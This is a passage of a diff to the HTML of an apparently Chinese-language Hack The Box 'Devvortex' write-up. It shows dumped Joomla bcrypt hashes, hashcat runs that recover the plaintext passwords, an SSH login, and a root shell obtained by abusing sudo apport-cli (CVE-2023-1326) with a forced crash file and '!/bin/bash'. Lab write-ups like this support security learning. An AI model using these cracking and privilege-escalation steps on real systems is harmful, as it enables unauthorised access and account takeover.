+| params        | text          | NO   |     | NULL    |                |
+| lastResetTime | datetime      | YES  |     | NULL    |                |
+| resetCount    | int           | NO   |     | 0       |                |
+| otpKey        | varchar(1000) | NO   |     |         |                |
+| otep          | varchar(1000) | NO   |     |         |                |
+| requireReset  | tinyint       | NO   |     | 0       |                |
+| authProvider  | varchar(100)  | NO   |     |         |                |
++---------------+---------------+------+-----+---------+----------------+
+17 rows in set (0.01 sec)
 
+mysql&gt; select name,username,password from sd4fg_users;
++------------+----------+--------------------------------------------------------------+
+| name       | username | password                                                     |
++------------+----------+--------------------------------------------------------------+
+| lewis      | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| logan paul | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++------------+----------+--------------------------------------------------------------+
+2 rows in set (0.00 sec)
+</code></pre>
 <p>这条logan paul的记录比较有意思 应该可以复用于ssh连接了 现在首要是撞出哈希</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ hashcat logan ../Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt --user -m 3200</span><br><span class="line">···</span><br><span class="line">$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho</span><br></pre></td></tr></table></figure>
-
+<pre><code>❯ hashcat logan ../Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt --user -m 3200
+···
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
+</code></pre>
 <p>当然反过来去撞lewis的密码也是可以的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❯ cat sqlpass</span><br><span class="line">P4ntherg0t1n5r3c0n##</span><br><span class="line">❯ hashcat logan  sqlpass --user -m 3200</span><br><span class="line">...</span><br><span class="line">$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u:P4ntherg0t1n5r3c0n##</span><br></pre></td></tr></table></figure>
-
+<pre><code>❯ cat sqlpass
+P4ntherg0t1n5r3c0n##
+❯ hashcat logan  sqlpass --user -m 3200
+...
+$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u:P4ntherg0t1n5r3c0n##
+</code></pre>
 <p>ok那就用logan:tequieromucho进行ssh登陆 成功拿到user.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh logan@10.10.11.242</span><br><span class="line">...</span><br><span class="line">logan@devvortex:~$ cat /home/logan/user.txt</span><br><span class="line">7255c0f90e316ba7041e99fa4732413c</span><br></pre></td></tr></table></figure>
-
+<pre><code>❯ ssh logan@10.10.11.242
+...
+logan@devvortex:~$ cat /home/logan/user.txt
+7255c0f90e316ba7041e99fa4732413c
+</code></pre>
 <h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>使用sudo -l之后发现可以用SUID提权 发现可以利用CVE-2023-1326</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:~$ sudo -l</span><br><span class="line">[sudo] password for logan:</span><br><span class="line">Matching Defaults entries for logan on devvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User logan may run the following commands on devvortex:</span><br><span class="line">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure>
+<pre><code>logan@devvortex:~$ sudo -l
+[sudo] password for logan:
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+</code></pre>
 <p>apport为处理崩溃程序 若还没崩溃文件那可以先制造一个</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:/var/crash$ sleep 20 &amp;</span><br><span class="line">[1] 2761</span><br><span class="line">logan@devvortex:/var/crash$ kill -ABRT 2761</span><br><span class="line">logan@devvortex:/var/crash$ ls</span><br><span class="line">_usr_bin_sleep.1000.crash</span><br><span class="line">[1]+  Aborted                 (core dumped) sleep 20</span><br></pre></td></tr></table></figure>
-
+<pre><code>logan@devvortex:/var/crash$ sleep 20 &amp;
+[1] 2761
+logan@devvortex:/var/crash$ kill -ABRT 2761
+logan@devvortex:/var/crash$ ls
+_usr_bin_sleep.1000.crash
+[1]+  Aborted                 (core dumped) sleep 20
+</code></pre>
 <p>获得到崩溃文件之后 就可以进行SUID啦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex: sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash</span><br><span class="line">press V (view report)</span><br><span class="line">!/bin/bash(直接输入 不用管屏幕显示的什么)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>logan@devvortex: sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
+press V (view report)
+!/bin/bash(直接输入 不用管屏幕显示的什么)
+
+</code></pre>
+
     </div>
 
     
